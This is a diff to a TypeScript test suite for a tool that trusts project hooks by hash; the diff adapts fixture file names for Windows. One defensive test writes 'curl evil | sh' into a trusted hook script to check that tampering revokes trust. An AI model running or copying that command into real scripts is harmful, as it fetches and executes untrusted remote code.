@@ -19,6 +19,11 @@ import { person } from "./support/person.ts";
 
 let tmp: string;
 const hooksEnv = process.env.FIN_TEST_HOOKS;
+// On Windows a hook's program is node or an .exe (nothing runs through a shell): the fixtures'
+// programs are named so there; their bytes are never run here.
+const WIN = process.platform === "win32";
+const EXE = WIN ? ".exe" : "";
+const SH = WIN ? ".exe" : ".sh";
 beforeAll(() => {
   process.env.FIN_TEST_HOOKS = "1";
 });
@@ -123,22 +128,22 @@ describe("layers", () => {
 
   test("run_relative_to_declaring_file: run[0] and file with a separator resolve in the declaring file's folder", () => {
     const { serverData, dir, config, trustHooks } = fixture();
-    const abs = join(tmp, "elsewhere", "check");
+    const abs = join(tmp, "elsewhere", `check${EXE}`);
     writeHooks(dir, [
-      hook("script", "PreCommand", { run: ["./bin/check", "--x", "a b"] }),
+      hook("script", "PreCommand", { run: [`./bin/check${EXE}`, "--x", "a b"] }),
       hook("node", "PreCommand", { run: ["node", "fake-hook.mjs"], file: "fake-hook.mjs" }),
       hook("abs", "PreCommand", { run: [abs], file: "sub/data.json" }),
     ]);
     // The project files the hooks name exist (the trusted hash binds them).
-    for (const f of ["bin/check", "fake-hook.mjs", "sub/data.json"]) {
+    for (const f of [`bin/check${EXE}`, "fake-hook.mjs", "sub/data.json"]) {
       mkdirSync(join(dir, f, ".."), { recursive: true });
       writeFileSync(join(dir, f), f);
     }
     trustHooks(config.project("p1").hooksHash);
-    writeJson(join(serverData, "settings.json"), { hooks: [hook("user", "PreCommand", { run: ["hooks/u.sh"] })] });
+    writeJson(join(serverData, "settings.json"), { hooks: [hook("user", "PreCommand", { run: [`hooks/u${SH}`] })] });
     const by = new Map(config.hooks("p1").map((h) => [h.id, h]));
     // A path with a separator is the declaring folder's; with no `file`, it is the hook's own file.
-    expect(by.get("script")).toMatchObject({ run: [join(dir, "bin", "check"), "--x", "a b"], file: join(dir, "bin", "check"), dir });
+    expect(by.get("script")).toMatchObject({ run: [join(dir, "bin", `check${EXE}`), "--x", "a b"], file: join(dir, "bin", `check${EXE}`), dir });
     // A bare name stays as written (resolved when it runs); `file` is the declaring folder's.
     expect(by.get("node")).toMatchObject({ run: ["node", "fake-hook.mjs"], file: join(dir, "fake-hook.mjs") });
     // An absolute program is kept, and is not the hook's own file.
@@ -162,13 +167,13 @@ describe("project files a hook names (review of Task 2)", () => {
     const f = fixture();
     mkdirSync(join(f.dir, "hooks"), { recursive: true });
     writeFileSync(join(f.dir, "hooks", "check.mjs"), "console.log(1)");
-    writeFileSync(join(f.dir, "hooks", "run.sh"), "exit 0");
+    writeFileSync(join(f.dir, "hooks", `run${SH}`), "exit 0");
     mkdirSync(join(tmp, "outside"), { recursive: true });
-    writeFileSync(join(tmp, "outside", "tool"), "tool");
+    writeFileSync(join(tmp, "outside", `tool${EXE}`), "tool");
     writeHooks(f.dir, [
       hook("a", "PreCommand", { run: ["node", "x.mjs"], file: "hooks/check.mjs" }),
-      hook("b", "PreCommand", { run: ["./hooks/run.sh"] }),
-      hook("c", "PreCommand", { run: [join(tmp, "outside", "tool")] }),
+      hook("b", "PreCommand", { run: [`./hooks/run${SH}`] }),
+      hook("c", "PreCommand", { run: [join(tmp, "outside", `tool${EXE}`)] }),
       hook("d", "PreCommand", { run: ["node", "y.mjs"], file: "./hooks/check.mjs" }),
     ]);
     return f;
@@ -178,13 +183,13 @@ describe("project files a hook names (review of Task 2)", () => {
   test("trust_hash_covers_scripts: the hooks file and each project file it names, by relative path", () => {
     const { dir, config, trustHooks, ids } = scripted();
     const p = config.project("p1");
-    expect(p.files).toEqual(["hooks/check.mjs", "hooks/run.sh"]);
-    expect(p.hooksHash).toBe(hooksHashOf(sha(join(dir, HOOKS_FILE)), [["hooks/check.mjs", sha(join(dir, "hooks", "check.mjs"))], ["hooks/run.sh", sha(join(dir, "hooks", "run.sh"))]]));
-    expect(config.list("p1")).toMatchObject({ projectHooksFiles: ["hooks/check.mjs", "hooks/run.sh"] });
+    expect(p.files).toEqual(["hooks/check.mjs", `hooks/run${SH}`]);
+    expect(p.hooksHash).toBe(hooksHashOf(sha(join(dir, HOOKS_FILE)), [["hooks/check.mjs", sha(join(dir, "hooks", "check.mjs"))], [`hooks/run${SH}`, sha(join(dir, "hooks", `run${SH}`))]]));
+    expect(config.list("p1")).toMatchObject({ projectHooksFiles: ["hooks/check.mjs", `hooks/run${SH}`] });
     trustHooks(p.hooksHash);
     expect(ids()).toEqual(["project:a", "project:b", "project:c", "project:d"]);
     // A program outside the project is not project content: changing it changes nothing.
-    writeFileSync(join(tmp, "outside", "tool"), "other tool");
+    writeFileSync(join(tmp, "outside", `tool${EXE}`), "other tool");
     expect(ids()).toHaveLength(4);
   });
 
@@ -192,7 +197,7 @@ describe("project files a hook names (review of Task 2)", () => {
     const { dir, config, trustHooks, ids } = scripted();
     trustHooks(config.project("p1").hooksHash);
     expect(ids()).toHaveLength(4);
-    writeFileSync(join(dir, "hooks", "run.sh"), "curl evil | sh");
+    writeFileSync(join(dir, "hooks", `run${SH}`), "curl evil | sh");
     expect(ids()).toEqual([]);
     expect(config.project("p1").status).toBe("changed");
     expect(config.warnings("p1")).toEqual([expect.objectContaining({ details: { projectId: "p1", status: "changed" } })]);
@@ -373,7 +378,7 @@ describe("over RPC", () => {
 
   test("hook_path_escaping_project_cannot_be_trusted over RPC", async () => {
     const { owner, projectId, dir } = await setUp();
-    writeHooks(dir, [hook("e", "PreCommand", { run: ["../elsewhere/run"] })]);
+    writeHooks(dir, [hook("e", "PreCommand", { run: [`../elsewhere/run${EXE}`] })]);
     const listed = await list(owner, projectId);
     expect(listed).toMatchObject({ projectHooks: "untrusted", projectHooksReason: "invalidHooks" });
     expect(listed.hooksHash).toBeUndefined();
